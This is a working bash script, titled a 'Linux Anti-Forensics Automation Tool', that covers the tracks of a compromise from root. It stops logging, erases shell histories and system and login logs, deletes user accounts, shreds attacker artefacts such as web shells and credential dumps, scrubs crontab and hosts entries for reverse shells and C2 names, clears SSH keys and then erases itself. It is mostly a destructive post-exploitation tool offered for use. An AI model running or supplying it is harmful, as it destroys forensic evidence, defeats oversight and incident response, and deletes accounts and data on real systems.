#!/bin/bash

echo ''
echo '███╗   ██╗██╗   ██╗██╗  ██╗███████╗'
echo '████╗  ██║██║   ██║██║ ██╔╝██╔════╝'
echo '██╔██╗ ██║██║   ██║█████╔╝ █████╗'
echo '██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝'
echo '██║ ╚████║╚██████╔╝██║  ██╗███████╗'
echo '╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝'
echo ''
echo '       Linux Anti-Forensics Automation Tool'
echo ''

# Safety: must be root
if [ "$EUID" -ne 0 ] && [ "$UID" -ne 0 ]; then
    echo "Must be root."
    exit 1
fi

SELF=$(readlink -f "$0")

echo "[*] Halting system logging..."
/etc/init.d/sysklogd stop 2>/dev/null
/etc/init.d/rsyslog stop 2>/dev/null
killall -9 syslogd rsyslogd 2>/dev/null

echo "[*] Wiping user histories (bash & zsh)..."
for home in /root /home/*; do
    [ -d "$home" ] || continue
    rm -f "$home/.bash_history" "$home/.bash_logout" 2>/dev/null
    rm -f "$home/.zsh_history" "$home/.zhistory" 2>/dev/null
    ln -sf /dev/null "$home/.bash_history" 2>/dev/null
done

echo "[*] Wiping current shell history..."
case "$SHELL" in
    */zsh)
        rm -f "$HOME/.zsh_history" 2>/dev/null
        fc -P 2>/dev/null
        ;;
    *)
        history -c 2>/dev/null
        ;;
esac
unset HISTFILE
export HISTSIZE=0

echo "[*] Wiping all system logs..."
cd /var/log 2>/dev/null || cd /var
for log in auth.log syslog messages debug daemon.log kern.log mail.log mail.info mail.warn mail.err user.log boot dmesg udev; do
    > "$log" 2>/dev/null
    rm -f "$log"* 2>/dev/null
done
for blog in wtmp btmp lastlog faillog tallylog; do
    > "$blog" 2>/dev/null
done
rm -f /var/log/apache2/* /var/log/proftpd/* /var/log/mysql/* /var/log/postgresql/* /var/log/samba/* /var/log/*.gz /var/log/*.1 /var/log/*.old 2>/dev/null

echo "[*] Removing non-default users (UID>=1000)..."
for user in $(awk -F: '$3>=1000 && $3<65534 {print $1}' /etc/passwd 2>/dev/null); do
    case "$user" in
        msfadmin|user|service|ftp) continue ;;
    esac
    pkill -u "$user" 2>/dev/null
    userdel -r "$user" 2>/dev/null
done

echo "[*] Shredding suspicious files..."
shred -zun 3 /tmp/bashdoor /tmp/cc.txt /tmp/creds.txt /dev/shm/root.hash 2>/dev/null
rm -rf /tmp/.stash /tmp/.hidden* /tmp/.cache* 2>/dev/null
rm -f /var/www/shell.php /var/www/backdoor.php /var/www/.shell* 2>/dev/null
rm -f /usr/local/bin/.backdoor* /usr/share/man/man3/.loader 2>/dev/null
find /tmp /var/tmp /dev/shm -type f -perm -4000 -exec rm -f {} \; 2>/dev/null

echo "[*] Cleaning cron, SSH keys, configs..."
sed -i '/nc -e/d; /bash -c/d; /reverse/d; /evil/d; /backdoor/d; /autowipe/d' /etc/crontab 2>/dev/null
rm -f /var/spool/cron/crontabs/* /usr/local/bin/autowipe.sh 2>/dev/null
for home in /root /home/*; do
    [ -d "$home/.ssh" ] && {
        > "$home/.ssh/authorized_keys" 2>/dev/null
        > "$home/.ssh/known_hosts" 2>/dev/null
    }
done
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null
sed -i '/evil.com/d; /c2-server/d; /hacker/d' /etc/hosts 2>/dev/null
ip neigh flush all 2>/dev/null

echo "[*] Wiping free slack space..."
dd if=/dev/zero of=/tmp/.wipe bs=1M count=10 2>/dev/null
rm -f /tmp/.wipe 2>/dev/null
dd if=/dev/zero of=/dev/shm/.wipe bs=1M count=10 2>/dev/null
rm -f /dev/shm/.wipe 2>/dev/null

echo "[+] Cleanup complete. Self-destructing..."
shred -zun 3 "$SELF" 2>/dev/null
rm -f "$SELF" 2>/dev/null
history -c 2>/dev/null
kill -9 $$ 2>/dev/null
exit 0
